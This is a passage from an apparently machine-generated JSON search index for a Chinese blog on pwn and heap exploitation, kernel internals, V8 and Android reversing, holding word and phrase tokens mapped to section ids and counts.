1},\"1\":{\"143\":2,\"246\":1,\"373\":1,\"378\":1,\"488\":3,\"491\":2,\"495\":1,\"500\":1,\"503\":5}}],[\"vctf\",{\"0\":{\"299\":1,\"361\":1}}],[\"vs\",{\"1\":{\"296\":1,\"344\":1,\"345\":1}}],[\"v1\",{\"1\":{\"252\":1,\"258\":1,\"382\":1,\"469\":2}}],[\"v1中\",{\"1\":{\"49\":1,\"189\":1}}],[\"vatble\",{\"1\":{\"395\":1,\"397\":3}}],[\"validate\",{\"0\":{\"428\":1},\"1\":{\"394\":2,\"427\":1,\"428\":1}}],[\"valid\",{\"1\":{\"390\":1,\"408\":1}}],[\"val\",{\"1\":{\"324\":1,\"339\":1}}],[\"values\",{\"1\":{\"324\":1}}],[\"value\",{\"1\":{\"125\":2,\"352\":1,\"408\":4,\"459\":1,\"460\":2,\"461\":3,\"462\":5,\"469\":1,\"470\":3,\"503\":3}}],[\"value=999\",{\"1\":{\"125\":2}}],[\"value=\",{\"1\":{\"125\":1}}],[\"vararg\",{\"1\":{\"470\":1}}],[\"var\",{\"1\":{\"121\":2,\"123\":5,\"124\":1,\"125\":1,\"126\":5,\"127\":5,\"131\":3,\"254\":1}}],[\"v8中利用指针标记技术在v8的堆指针中存储额外的数据\",{\"1\":{\"82\":1,\"222\":1}}],[\"v8\",{\"0\":{\"81\":1,\"221\":1},\"1\":{\"83\":1,\"223\":1,\"459\":2}}],[\"vmmap得到的\",{\"1\":{\"287\":1}}],[\"vm\",{\"0\":{\"77\":1,\"217\":1}}],[\"vmlinux\",{\"1\":{\"73\":1,\"213\":1}}],[\"vmalloc\",{\"1\":{\"70\":1,\"210\":1}}],[\"vfwprintf\",{\"1\":{\"60\":1,\"200\":1}}],[\"vfxprintf\",{\"1\":{\"60\":1,\"200\":1}}],[\"vfxprintf函数\",{\"1\":{\"60\":1,\"200\":1}}],[\"void\",{\"1\":{\"60\":1,\"124\":1,\"125\":2,\"200\":1,\"305\":1,\"313\":1,\"315\":1,\"322\":1,\"324\":1,\"333\":1,\"339\":1,\"344\":1,\"353\":1,\"389\":2,\"397\":6,\"404\":1,\"410\":1,\"417\":2,\"438\":1,\"439\":3,\"441\":1,\"442\":2,\"458\":6,\"459\":2,\"460\":3,\"462\":4}}],[\"程序寻找libc的顺序\",{\"0\":{\"453\":1}}],[\"程序会自动保存下一个指令的地址\",{\"1\":{\"446\":1}}],[\"程序员可以选择显性地去书写和类同名地一个public方法\",{\"1\":{\"124\":1}}],[\"程序执行exit\",{\"1\":{\"60\":1,\"200\":1}}],[\"程序计数器\",{\"1\":{\"47\":1,\"187\":1}}],[\"je\",{\"1\":{\"483\":2}}],[\"jrs\",{\"1\":{\"463\":1}}],[\"j\",{\"1\":{\"459\":4}}],[\"join\",{\"1\":{\"458\":3,\"459\":1}}],[\"jollywing\",{\"1\":{\"452\":1}}],[\"jmp\",{\"1\":{\"410\":2,\"449\":4,\"483\":4}}],[\"jump都是同一个vtable\",{\"1\":{\"403\":1}}],[\"jump1\",{\"1\":{\"394\":2}}],[\"jump\",{\"1\":{\"390\":1,\"395\":63,\"399\":2,\"401\":23,\"408\":1,\"410\":1,\"428\":2}}],[\"jumps数据进行查看一下\",{\"1\":{\"414\":1}}],[\"jumps>\",{\"1\":{\"411\":1}}],[\"jumps地址\",{\"1\":{\"385\":1,\"388\":1}}],[\"jumps\",{\"1\":{\"59\":2,\"60\":1,\"199\":2,\"200\":1,\"384\":1,\"387\":2,\"394\":3,\"395\":11,\"397\":6,\"403\":3,\"410\":1,\"413\":2}}],[\"jumps指针\",{\"1\":{\"59\":1,\"199\":1}}],[\"jumps的\",{\"1\":{\"59\":1,\"199\":1,\"387\":1}}],[\"just\",{\"1\":{\"286\":1,\"353\":1}}],[\"jailed\",{\"1\":{\"131\":1}}],[\"java会自动给你补上\",{\"1\":{\"124\":1}}],[\"java\",{\"1\":{\"121\":2,\"125\":2,\"126\":1,\"131\":3,\"134\":3}}],[\"json\",{\"1\":{\"258\":1}}],[\"js代码\",{\"1\":{\"123\":1}}],[\"js代码的书写\",{\"0\":{\"119\":1}}],[\"js\",{\"1\":{\"118\":2,\"131\":2}}],[\"js脚本\",{\"0\":{\"117\":1}}],[\"js对象基础属性\",{\"0\":{\"84\":1,\"224\":1}}],[\"jsc\",{\"0\":{\"81\":1,\"221\":1}}],[\"jianshu\",{\"1\":{\"30\":1,\"172\":1}}],[\"触发exit\",{\"0\":{\"386\":1}}],[\"触发exit函数\",{\"1\":{\"383\":1,\"384\":1,\"395\":1}}],[\"触发double\",{\"1\":{\"380\":1,\"502\":1}}],[\"触发fastbin的合并\",{\"1\":{\"376\":1,\"490\":1,\"498\":1}}],[\"触发fastbin的合并机制\",{\"1\":{\"372\":1,\"494\":1}}],[\"触发chunk6和chunk5合并\",{\"1\":{\"367\":1}}],[\"触发合并\",{\"1\":{\"365\":1,\"369\":1}}],[\"触发unlink漏洞\",{\"1\":{\"294\":1}}],[\"触发unsortedbin分类合并机制\",{\"1\":{\"57\":1,\"197\":1}}],[\"触发其回调函数\",{\"1\":{\"279\":1}}],[\"触发\",{\"1\":{\"60\":1,\"124\":1,\"200\":1}}],[\"触发缺页异常后\",{\"1\":{\"17\":1,\"159\":1}}],[\"导致tcache\",{\"1\":{\"380\":1,\"502\":1}}],[\"导致我反复失败\",{\"1\":{\"380\":1,\"502\":1}}],[\"导致我们的复现失败\",{\"1\":{\"256\":1}}],[\"导致我们没办法再通过直接获取任意地址\",{\"1\":{\"56\":1,\"196\":1}}],[\"导致写放大也就是本来期望修改一个节点\",{\"1\":{\"8\":1,\"150\":1}}],[\"范围\",{\"1\":{\"56\":1,\"196\":1,\"376\":1,\"498\":1}}],[\"利用格式化字符串漏洞就能泄露libc地址\",{\"1\":{\"473\":1}}],[\"利用这里会让字符串地址赋值给rdi\",{\"1\":{\"473\":1}}],[\"利用条件\",{\"0\":{\"422\":1}}],[\"利用原理\",{\"0\":{\"363\":1}}],[\"利用double\",{\"1\":{\"339\":1}}],[\"利用tcache泄露地址\",{\"0\":{\"287\":1}}],[\"利用malloc\",{\"1\":{\"59\":1,\"199\":1}}],[\"利用\",{\"0\":{\"56\":1,\"196\":1,\"364\":1}}],[\"让它绕过安全检测\",{\"1\":{\"491\":1}}],[\"让它的size\",{\"1\":{\"363\":1}}],[\"让原本的信息头chunk成为我们的内容chunk\",{\"1\":{\"372\":1,\"494\":1}}],[\"让fastbin链中第二个chunk\",{\"1\":{\"490\":1}}],[\"让fastbin进入unsortedbin中\",{\"1\":{\"372\":1,\"494\":1}}],[\"让fd和bk填充进去\",{\"1\":{\"357\":1}}],[\"让chunk进入fastbin链中\",{\"1\":{\"376\":1,\"498\":1}}],[\"让chunk进入unsortedbin中\",{\"1\":{\"372\":1,\"494\":1}}],[\"让chunk4到fake\",{\"1\":{\"55\":1,\"195\":1}}],[\"让我们没办法直接覆盖fd\",{\"1\":{\"379\":1,\"501\":1}}],[\"让我们自己构造的size刚好覆盖在原chunk3\",{\"1\":{\"365\":1}}],[\"让我们可以分割\",{\"1\":{\"365\":1,\"369\":1}}],[\"让两个chunk\",{\"1\":{\"365\":1}}],[\"让tcache\",{\"1\":{\"358\":2}}],[\"让bck等于fwd\",{\"1\":{\"319\":1}}],[\"让0溢出到\",{\"1\":{\"302\":1}}],[\"让第八个gundam出现在unsorted\",{\"1\":{\"287\":1}}],[\"让这个指针指向我们想要调用的函数\",{\"1\":{\"36\":1,\"176\":1}}],[\"五个chunkchunk1\",{\"1\":{\"55\":1,\"195\":1}}],[\"具体就是让我们要劫持的chunk刚好处于合并区间之间比如\",{\"1\":{\"55\":1,\"195\":1}}],[\"具体来讲\",{\"1\":{\"10\":1,\"152\":1}}],[\"我可能会选择这样\",{\"1\":{\"401\":1}}],[\"我可以间接利用然后实现劫持正在使用的合法chunk\",{\"1\":{\"55\":1,\"195\":1}}],[\"我选择了将topchunk消耗完毕触发合并的方式\",{\"1\":{\"376\":1,\"498\":1}}],[\"我这边采用的arahat0佬的劫持\",{\"1\":{\"372\":1,\"494\":1}}],[\"我这里的理解是如提交pr的时候先挂着\",{\"1\":{\"269\":1}}],[\"我直接copy了\",{\"1\":{\"330\":1}}],[\"我是大概浏览的\",{\"1\":{\"323\":1}}],[\"我在这里\",{\"1\":{\"310\":1}}],[\"我在以前都忽略了readme的存在于是系统学习学习参考文章一个开源项目的readme文档应该包含哪些信息才算是一份合格的文档\",{\"1\":{\"105\":1}}],[\"我继续基于我的分支进行了fix\",{\"1\":{\"275\":1}}],[\"我以为是docker无法链接外部网络的问题\",{\"1\":{\"261\":1}}],[\"我犯蠢了\",{\"1\":{\"134\":1}}],[\"我们malloc一个巨无霸然后就可以覆写fastbin\",{\"1\":{\"491\":1}}],[\"我们再申请为\",{\"1\":{\"490\":1}}],[\"我们再将这个大chunk\",{\"1\":{\"488\":1}}],[\"我们劫持head\",{\"1\":{\"490\":1}}],[\"我们不太方便伪造fake\",{\"1\":{\"488\":1}}],[\"我们用栈传递参数让rdx赋值给rdi\",{\"1\":{\"482\":1}}],[\"我们选择打exit\",{\"1\":{\"476\":1}}],[\"我们选择返回一个future对象\",{\"1\":{\"280\":1}}],[\"我们手搓一个程序\",{\"1\":{\"470\":1}}],[\"我们猜测是每个函数要等待上一个函数执行完毕再执行\",{\"1\":{\"460\":1}}],[\"我们点入value变量\",{\"1\":{\"460\":1}}],[\"我们假设我们的函数在plt\",{\"1\":{\"449\":1}}],[\"我们程序究竟是怎么运行的\",{\"1\":{\"449\":1}}],[\"我们来到了leave\",{\"1\":{\"446\":1}}],[\"我们来详细分析一下这个流程中究竟干了什么\",{\"1\":{\"325\":1}}],[\"我们在ebp这个位置放入我们我们希望这个栈最终落脚点\",{\"1\":{\"446\":1}}],[\"我们带符号打印一下\",{\"1\":{\"431\":1}}],[\"我们对\",{\"1\":{\"414\":1}}],[\"我们如何处理数据以及怎么把数据返还回去\",{\"1\":{\"435\":1}}],[\"我们如何设计一个结构体\",{\"1\":{\"401\":1}}],[\"我们如果可以劫持largebin\",{\"1\":{\"57\":1,\"197\":1}}],[\"我们喜欢把write\",{\"1\":{\"400\":1}}],[\"我们要伪造三个chunk\",{\"1\":{\"396\":1}}],[\"我们要调试内核或者查看rop链的时候\",{\"1\":{\"73\":1,\"213\":1}}],[\"我们看看这个函数的调用链\",{\"1\":{\"395\":1}}],[\"我们结合结构体来理解一下\",{\"1\":{\"388\":1}}],[\"我们的fd需要经过与\",{\"1\":{\"378\":1,\"500\":1}}],[\"我们的size得>=2\",{\"1\":{\"339\":1}}],[\"我们需要修改的plt条目的位置\",{\"1\":{\"451\":1}}],[\"我们需要进行tcp的三次握手\",{\"1\":{\"435\":1}}],[\"我们需要控制内存对齐\",{\"1\":{\"378\":1,\"500\":1}}],[\"我们需要利用\",{\"1\":{\"367\":1}}],[\"我们需要先赋值给rax\",{\"1\":{\"45\":1,\"185\":1}}],[\"我们把我们构造的chunk叫做fake\",{\"1\":{\"365\":1}}],[\"我们一次性只能new一个0xff大小的chunk\",{\"1\":{\"357\":1}}],[\"我们一般采用refq\",{\"1\":{\"42\":1,\"182\":1}}],[\"我们修改fwd的bk\",{\"1\":{\"325\":1}}],[\"我们修改largebin中的chunk\",{\"1\":{\"325\":1}}],[\"我们主要探讨在第一次数据绑定的时候\",{\"1\":{\"449\":1}}],[\"我们主要是针对socket提供的接口进行一个调用\",{\"1\":{\"434\":1}}],[\"我们主要是利用\",{\"1\":{\"325\":1}}],[\"我们主要的利用都是这里\",{\"1\":{\"425\":1}}],[\"我们主要利用这两行代码\",{\"1\":{\"325\":1}}],[\"我们large\",{\"1\":{\"321\":1}}],[\"我们只要能够实现这两个部分就可以了\",{\"1\":{\"446\":1}}],[\"我们只需要让rdx寄存器的值给rdi\",{\"1\":{\"482\":1}}],[\"我们只需要关心我们监听了什么端口然后调用read函数返回了什么数据\",{\"1\":{\"435\":1}}],[\"我们只需要malloc回来即可\",{\"1\":{\"373\":1,\"495\":1}}],[\"我们只处理这一种情况\",{\"1\":{\"321\":1}}],[\"我们只有真的写的时候才会影响实际的物理内存\",{\"1\":{\"71\":1,\"211\":1}}],[\"我们应该先调整fwd和bck\",{\"1\":{\"319\":1}}],[\"我们应该是继承a类造出c类\",{\"1\":{\"252\":1}}],[\"我们从unsortedbin抠出来的chunk就要合并进入fwd和bck的中间\",{\"1\":{\"316\":1}}],[\"我们会发现fd和bk都是指向了自己本身也就是main\",{\"1\":{\"311\":1}}],[\"我们清空unsortedbin看看\",{\"1\":{\"311\":1}}],[\"我们先把unsorted\",{\"1\":{\"357\":1}}],[\"我们先理清楚largebin的结构\",{\"1\":{\"308\":1}}],[\"我们先通过指令查到我们的包名\",{\"1\":{\"133\":1}}],[\"我们这里开始简单运算一下\",{\"1\":{\"292\":1}}],[\"我们这里知道了第七个地址\",{\"1\":{\"287\":1}}],[\"我们这里选择修改nickname这个属性\",{\"1\":{\"125\":1}}],[\"我们直接malloc一个大小一样的chunk\",{\"1\":{\"484\":1}}],[\"我们直接使用平替函数\",{\"1\":{\"483\":1}}],[\"我们直接输入指令\",{\"1\":{\"274\":1}}],[\"我们直接通过mprotect函数\",{\"1\":{\"504\":1}}],[\"我们直接通过\",{\"1\":{\"121\":1}}],[\"我们为什么需要它\",{\"1\":{\"270\":1}}],[\"我们使用\",{\"1\":{\"258\":1}}],[\"我们a的数据发生变化的时候\",{\"1\":{\"250\":1}}],[\"我们重心在后面\",{\"1\":{\"246\":1}}],[\"我们本来就拥有e所以就可以算出d\",{\"1\":{\"241\":1}}],[\"我们成功筛选出我们的主activity\",{\"1\":{\"144\":1}}],[\"我们有两个特征值\",{\"1\":{\"144\":1}}],[\"我们就相当于chunk的p为0也就是我们构造的fake\",{\"1\":{\"345\":1}}],[\"我们就能够泄露victim的地址\",{\"1\":{\"325\":1}}],[\"我们就可以malloc一个\",{\"1\":{\"306\":1}}],[\"我们就可以实现绕过这两个保护\",{\"1\":{\"74\":1,\"214\":1}}],[\"我们就列举一些目前逆向过程中遇见的\",{\"1\":{\"143\":1}}],[\"我们执行指令\",{\"1\":{\"131\":1}}],[\"我们首先要获取它的包名提前声明这里实战\",{\"1\":{\"128\":1}}],[\"我们调试一个程序的时候\",{\"1\":{\"128\":1}}],[\"我们申请就会失败\",{\"1\":{\"71\":1,\"211\":1}}],[\"我们已经大概的复习了一下两级分页机制\",{\"1\":{\"63\":1,\"203\":1}}],[\"我们得到被新线程的stack\",{\"1\":{\"38\":1,\"178\":1}}],[\"我们可控区域\",{\"1\":{\"36\":1,\"176\":1}}],[\"我们可以让head\",{\"1\":{\"490\":1}}],[\"我们可以直接劫持gift函数和hello\",{\"1\":{\"489\":1}}],[\"我们可以利用合并机制\",{\"1\":{\"488\":1}}],[\"我们可以利用rep\",{\"1\":{\"482\":1}}],[\"我们可以利用delete后没有清空的特性将原本的头chunk覆盖掉\",{\"1\":{\"374\":1,\"496\":1}}],[\"我们可以第一次写入目标地址\",{\"1\":{\"476\":1}}],[\"我们可以从图中大概知道\",{\"1\":{\"433\":1}}],[\"我们可以另外再想办法\",{\"1\":{\"429\":1}}],[\"我们可以在伪造的file结构体0xa0位置填写上可控的一个chunk地址\",{\"1\":{\"395\":1}}],[\"我们可以在设置\",{\"1\":{\"69\":1,\"209\":1}}],[\"我们可以看见我们相对熟悉的fastbinsy和bins也就是我们接触最多的fastbin\",{\"1\":{\"347\":1}}],[\"我们可以发现rdx已经有了我们执行shellcode的地址\",{\"1\":{\"482\":1}}],[\"我们可以发现这里的条件主要是两部分\",{\"1\":{\"426\":1}}],[\"我们可以发现这里就没有vatble的检查了\",{\"1\":{\"395\":1}}],[\"我们可以发现这个调用最终会调用io\",{\"1\":{\"394\":1}}],[\"我们可以发现这个地方fd和bk都指向了\",{\"1\":{\"287\":1}}],[\"我们可以发现调用这个的时候并不存在vatble的检查\",{\"1\":{\"395\":1}}],[\"我们可以发现\",{\"1\":{\"325\":1}}],[\"我们可以调试看看\",{\"1\":{\"310\":1}}],[\"我们可以简化一下\",{\"1\":{\"308\":1}}],[\"我们可以明显发现\",{\"1\":{\"303\":1}}],[\"我们可以知道\",{\"1\":{\"144\":1,\"339\":1}}],[\"我们可以将\",{\"1\":{\"59\":1,\"199\":1}}],[\"我们可以通过\",{\"1\":{\"476\":1}}],[\"我们可以通过reloc\",{\"1\":{\"451\":1}}],[\"我们可以通过向scanf输入大量数据\",{\"1\":{\"376\":1,\"498\":1}}],[\"我们可以通过让topchunk消耗完毕\",{\"1\":{\"376\":1,\"498\":1}}],[\"我们可以通过申请large\",{\"1\":{\"376\":1,\"498\":1}}],[\"我们可以通过劫持合法chunk轻松实现double\",{\"1\":{\"55\":1,\"195\":1}}],[\"我们可以通过这个知道我们要绑定的函数名字\",{\"1\":{\"36\":1,\"176\":1}}],[\"我们可以选择一些思路来进行绕过\",{\"1\":{\"42\":1,\"182\":1}}],[\"我们可以允许系统调用\",{\"1\":{\"41\":1,\"181\":1}}],[\"我们可以大致把中断分为中断和异常\",{\"1\":{\"20\":1,\"162\":1}}],[\"我们通过提前在栈里面写满backdoor地址\",{\"1\":{\"480\":1}}],[\"我们通过连续申请8个gundam\",{\"1\":{\"287\":1}}],[\"我们通过chunk3写入内容覆盖chunk4完成覆写p位并且构造好prev\",{\"1\":{\"55\":1,\"195\":1}}],[\"我们通过页号来获取基础地址再加上页内偏移\",{\"1\":{\"10\":1,\"152\":1}}],[\"我们通常会用到\",{\"1\":{\"4\":1,\"147\":1}}],[\"常用指令绕过\",{\"0\":{\"463\":1}}],[\"常用利用结构体\",{\"0\":{\"75\":1,\"215\":1}}],[\"常量指针是指针\",{\"1\":{\"399\":1}}],[\"常见开发遇到的规范问题\",{\"0\":{\"245\":1}}],[\"常见利用技巧\",{\"0\":{\"55\":1,\"195\":1}}],[\"常规\",{\"1\":{\"347\":1}}],[\"常规保护机制\",{\"0\":{\"74\":1,\"214\":1}}],[\"常规绕过\",{\"0\":{\"42\":1,\"182\":1}}],[\"koko\",{\"1\":{\"395\":3}}],[\"kept\",{\"1\":{\"347\":1}}],[\"keeping\",{\"1\":{\"286\":1}}],[\"keys\",{\"1\":{\"464\":1}}],[\"key\",{\"1\":{\"243\":2,\"380\":2,\"502\":2,\"503\":5}}],[\"kernel文件系统\",{\"1\":{\"73\":1,\"213\":1}}],[\"kernel部分比较重要需要重新梳理一下\",{\"1\":{\"62\":1,\"202\":1}}],[\"kernel\",{\"0\":{\"62\":1,\"72\":1,\"202\":1,\"212\":1},\"1\":{\"73\":2,\"74\":3,\"79\":1,\"213\":2,\"214\":3,\"219\":1}}],[\"kphi\",{\"1\":{\"242\":1}}],[\"kptr\",{\"1\":{\"74\":1,\"214\":1}}],[\"kpti\",{\"1\":{\"74\":1,\"214\":1}}],[\"know\",{\"1\":{\"324\":2,\"417\":1}}],[\"known\",{\"1\":{\"261\":2}}],[\"kn带入得到\",{\"1\":{\"240\":1}}],[\"kn\",{\"1\":{\"240\":2}}],[\"kφ\",{\"1\":{\"240\":1}}],[\"kafka\",{\"0\":{\"99\":1}}],[\"kaslr\",{\"1\":{\"74\":1,\"214\":1}}],[\"kswapd\",{\"1\":{\"68\":1,\"208\":1}}],[\"kill\",{\"1\":{\"69\":1,\"209\":1}}],[\"kiwi\",{\"0\":{\"59\":1,\"199\":1}}],[\"kiprey\",{\"1\":{\"54\":1,\"194\":1}}],[\"kmap函数可以通过将高端的内存映射到该区域去\",{\"1\":{\"16\":1,\"158\":1}}],[\"翻阅源码即可然后找到一个很好用的网站写了源码中的宏定义heap\",{\"1\":{\"54\":1,\"194\":1}}],[\"比较成体系的利用方式\",{\"1\":{\"53\":1,\"193\":1}}],[\"比如对scanf等函数进行操作\",{\"1\":{\"429\":1}}],[\"比如对宏进行展开\",{\"1\":{\"87\":1,\"227\":1}}],[\"比如现在fastbin\",{\"1\":{\"339\":1}}],[\"比如0x1003就是取fs的值\",{\"1\":{\"333\":1}}],[\"比如a类要调用b类的函数\",{\"1\":{\"252\":1}}],[\"比如当一个架构已经大体固定下来了\",{\"1\":{\"252\":1}}],[\"比如mvc中model包含了对象的属性\",{\"1\":{\"252\":1}}],[\"比如说mvc中model仅仅包含对象属性的定义和操作对象的get\",{\"1\":{\"252\":1}}],[\"比如实现一个广告系统\",{\"1\":{\"250\":1}}],[\"比如用户行为或者model发生的变化\",{\"1\":{\"249\":1}}],[\"比如数据库等\",{\"1\":{\"247\":1}}],[\"比如加密\",{\"1\":{\"240\":1}}],[\"比如32位操作系统下最低有效位用来区分smis\",{\"1\":{\"82\":1,\"222\":1}}],[\"比如内核通过alloc\",{\"1\":{\"70\":1,\"210\":1}}],[\"比如把这个值设置位\",{\"1\":{\"69\":1,\"209\":1}}],[\"比如栈堆等\",{\"1\":{\"68\":1,\"208\":1}}],[\"比如有一些题必须free\",{\"1\":{\"55\":1,\"195\":1}}],[\"比如修改fd\",{\"1\":{\"53\":1,\"193\":1}}],[\"比如我有一个a类其中有个b函数\",{\"1\":{\"252\":1}}],[\"比如我们函数之间传递的应该大多数时候是接口\",{\"1\":{\"252\":1}}],[\"比如我们推算d的公式\",{\"1\":{\"241\":1}}],[\"比如我们没办法直接将一个较大的立即数通过push等直接推入栈\",{\"1\":{\"45\":1,\"185\":1}}],[\"比如我定义一个结构体\",{\"1\":{\"24\":1,\"166\":1}}],[\"比如\",{\"1\":{\"37\":1,\"39\":1,\"177\":1,\"179\":1,\"325\":1,\"388\":1,\"456\":1}}],[\"比如slice\",{\"1\":{\"30\":1,\"172\":1}}],[\"比如二级分页机制的话\",{\"1\":{\"21\":1,\"163\":1}}],[\"比如cpu的异常事件\",{\"1\":{\"20\":1,\"162\":1}}],[\"比如鼠标点击之类的\",{\"1\":{\"20\":1,\"162\":1}}],[\"文档的变更\",{\"1\":{\"265\":1}}],[\"文章中我们先讲原理\",{\"1\":{\"361\":1}}],[\"文章中推荐的主力pwn环境是\",{\"1\":{\"259\":1}}],[\"文章\",{\"1\":{\"277\":1}}],[\"文章说的\",{\"1\":{\"273\":1}}],[\"文章进行总结得很好\",{\"1\":{\"53\":1,\"193\":1}}],[\"文件可写\",{\"1\":{\"426\":1}}],[\"文件流\",{\"1\":{\"400\":1}}],[\"文件\",{\"1\":{\"13\":1,\"155\":1}}],[\"文件描述符\",{\"0\":{\"15\":1,\"157\":1}}],[\"文件描述符才真正被关闭\",{\"1\":{\"4\":1,\"147\":1}}],[\"文件描述符的引用计数减1\",{\"1\":{\"4\":1,\"147\":1}}],[\"轻量级的嵌入式开发glibc库\",{\"1\":{\"52\":1,\"192\":1}}],[\"知道libc基地址\",{\"1\":{\"422\":1}}],[\"知道了私钥就有办法通过密文解密出原文\",{\"1\":{\"241\":1}}],[\"知\",{\"1\":{\"52\":1,\"192\":1}}],[\"知乎\",{\"1\":{\"2\":1,\"3\":1,\"5\":1,\"8\":1,\"10\":2,\"12\":1,\"13\":1,\"16\":2,\"105\":1,\"140\":1,\"143\":1,\"145\":1,\"146\":1,\"148\":1,\"150\":1,\"152\":2,\"154\":1,\"155\":1,\"158\":2,\"272\":1,\"277\":1,\"432\":1,\"449\":1}}],[\"类\",{\"1\":{\"252\":1}}],[\"类似于这样\",{\"1\":{\"461\":1}}],[\"类似于进程中的\",{\"1\":{\"458\":1}}],[\"类似于lagrebin的管理模式\",{\"1\":{\"50\":1,\"190\":1}}],[\"类似文章中举列子的一样\",{\"1\":{\"123\":1}}],[\"类型\",{\"0\":{\"20\":1,\"162\":1},\"1\":{\"263\":1,\"265\":2}}],[\"他们分配在不同的page上\",{\"1\":{\"50\":1,\"190\":1}}],[\"他们会共同获取相同的指针指向相同的资源\",{\"1\":{\"8\":1,\"150\":1}}],[\"88\",{\"1\":{\"503\":1}}],[\"888\",{\"1\":{\"124\":1,\"125\":1}}],[\"8号就是我们要修改的chunk\",{\"1\":{\"491\":1}}],[\"8位置\",{\"1\":{\"479\":1}}],[\"8byte\",{\"0\":{\"443\":1}}],[\"8时\",{\"1\":{\"373\":1,\"495\":1}}],[\"8个\",{\"1\":{\"358\":1}}],[\"8个chunk\",{\"1\":{\"358\":1}}],[\"892\",{\"1\":{\"261\":1}}],[\"896mb的内核空间是与物理地址前896mb\",{\"1\":{\"16\":1,\"158\":1}}],[\"80\",{\"1\":{\"261\":5,\"470\":1,\"483\":1}}],[\"8000\",{\"1\":{\"70\":1,\"210\":1}}],[\"8g\",{\"1\":{\"71\":1,\"211\":1}}],[\"8\",{\"1\":{\"50\":1,\"131\":1,\"190\":1,\"262\":1,\"289\":1,\"290\":1,\"292\":2,\"358\":2,\"359\":1,\"365\":11,\"366\":2,\"367\":1,\"368\":2,\"369\":17,\"373\":5,\"376\":4,\"378\":2,\"380\":6,\"397\":1,\"459\":1,\"461\":2,\"473\":1,\"475\":3,\"479\":2,\"480\":1,\"481\":2,\"482\":1,\"483\":1,\"484\":1,\"486\":1,\"488\":4,\"491\":8,\"495\":5,\"498\":4,\"500\":2,\"502\":6,\"503\":27,\"504\":1,\"505\":2}}],[\"小内存分配的可用位置链表\",{\"1\":{\"438\":1}}],[\"小知识点\",{\"0\":{\"430\":1}}],[\"小于2mb\",{\"1\":{\"438\":1}}],[\"小于2044kb\",{\"1\":{\"50\":1,\"190\":1}}],[\"小于3\",{\"1\":{\"438\":1}}],[\"小于minsize\",{\"1\":{\"321\":1}}],[\"小林coding\",{\"1\":{\"63\":1,\"66\":1,\"68\":1,\"71\":1,\"203\":1,\"206\":1,\"208\":1,\"211\":1}}],[\"小客栈\",{\"1\":{\"1\":1}}],[\"分为三种大小\",{\"1\":{\"438\":1}}],[\"分别是缓冲区chunk的开头和末尾\",{\"1\":{\"431\":1}}],[\"分割大chunk\",{\"1\":{\"365\":1}}],[\"分支管理\",{\"0\":{\"267\":1}}],[\"分支到函数\",{\"1\":{\"47\":1,\"187\":1}}],[\"分析与利用\",{\"1\":{\"372\":1,\"494\":1}}],[\"分析一下题\",{\"0\":{\"292\":1}}],[\"分析\",{\"0\":{\"135\":1}}],[\"分享\",{\"1\":{\"132\":1}}],[\"分配后整个结构体转为char使用\",{\"1\":{\"438\":1}}],[\"分配在不同的page上\",{\"1\":{\"438\":1}}],[\"分配空间\",{\"1\":{\"403\":1}}],[\"分配对应大小的空间\",{\"1\":{\"403\":1}}],[\"分配一个heap\",{\"1\":{\"353\":1}}],[\"分配区空闲链表\",{\"1\":{\"347\":1}}],[\"分配区链表\",{\"1\":{\"347\":2}}],[\"分配区全局链表\",{\"1\":{\"347\":2}}],[\"分配区heap\",{\"1\":{\"346\":1}}],[\"分配区状态机malloc\",{\"1\":{\"346\":1}}],[\"分配操作\",{\"0\":{\"309\":1}}],[\"分配内存页使用alloc\",{\"1\":{\"70\":1,\"210\":1}}],[\"分配的单位\",{\"1\":{\"66\":1,\"206\":1}}],[\"分配若干个page\",{\"1\":{\"50\":1,\"190\":1}}],[\"分配若干个chunk\",{\"1\":{\"50\":1,\"190\":1}}],[\"大致原理都是相同的\",{\"1\":{\"503\":1}}],[\"大致就是构造一个情况\",{\"1\":{\"488\":1}}],[\"大致利用原理\",{\"0\":{\"372\":1,\"494\":1}}],[\"大内存链表\",{\"1\":{\"438\":1}}],[\"大约有10个定长队列\",{\"1\":{\"347\":1}}],[\"大多数性质和fastbin是一样的\",{\"1\":{\"340\":1}}],[\"大多数内存页都是可以直接释放的\",{\"1\":{\"68\":1,\"208\":1}}],[\"大小0x110\",{\"1\":{\"368\":1}}],[\"大小\",{\"1\":{\"336\":1}}],[\"大小刚好相等情况\",{\"0\":{\"315\":1}}],[\"大小刚好大于所需nb大小+minsize\",{\"1\":{\"313\":1}}],[\"大小的\",{\"1\":{\"312\":1}}],[\"大小检查\",{\"1\":{\"296\":1}}],[\"大小为0x30\",{\"1\":{\"287\":1}}],[\"大于2mb小于4k\",{\"1\":{\"438\":1}}],[\"大于8个就行\",{\"1\":{\"358\":1}}],[\"大于max\",{\"1\":{\"284\":1}}],[\"大于3\",{\"1\":{\"50\":1,\"190\":1}}],[\"大概\",{\"1\":{\"400\":1}}],[\"大概率不对齐\",{\"1\":{\"380\":1,\"502\":1}}],[\"大概率会是内存不对齐\",{\"1\":{\"378\":1,\"500\":1}}],[\"大概思路\",{\"1\":{\"372\":1,\"494\":1}}],[\"大概思路就是\",{\"1\":{\"302\":1}}],[\"大概意思是去剩下的chunk中寻找\",{\"1\":{\"323\":1}}],[\"大概就是调用\",{\"1\":{\"449\":1}}],[\"大概就是这个样子\",{\"1\":{\"308\":1}}],[\"大概就是首先通过链表把各个桶链接起来\",{\"1\":{\"25\":1,\"167\":1}}],[\"大概是docker代理的问题\",{\"1\":{\"261\":1}}],[\"书栈网\",{\"1\":{\"50\":1,\"190\":1,\"436\":1,\"437\":1}}],[\"书籍是go语言设计与实现\",{\"1\":{\"22\":1,\"164\":1}}],[\"试读\",{\"1\":{\"50\":1,\"190\":1,\"436\":1,\"437\":1}}],[\"zip\",{\"1\":{\"463\":1}}],[\"zend中只有一个heap结构\",{\"1\":{\"438\":1}}],[\"zend\",{\"1\":{\"438\":23,\"439\":21,\"441\":10,\"442\":11}}],[\"zend内存池\",{\"1\":{\"50\":1,\"190\":1,\"436\":1}}],[\"zhuanlan\",{\"1\":{\"10\":1,\"13\":1,\"140\":1,\"152\":1,\"155\":1}}],[\"zhihu\",{\"1\":{\"2\":1,\"3\":1,\"5\":1,\"8\":1,\"10\":3,\"12\":1,\"13\":2,\"16\":2,\"105\":1,\"140\":2,\"143\":1,\"145\":1,\"146\":1,\"148\":1,\"150\":1,\"152\":3,\"154\":1,\"155\":2,\"158\":2,\"272\":1,\"277\":1,\"432\":1,\"449\":1}}],[\"第7章\",{\"1\":{\"437\":1}}],[\"第10个chunk\",{\"1\":{\"302\":1}}],[\"第10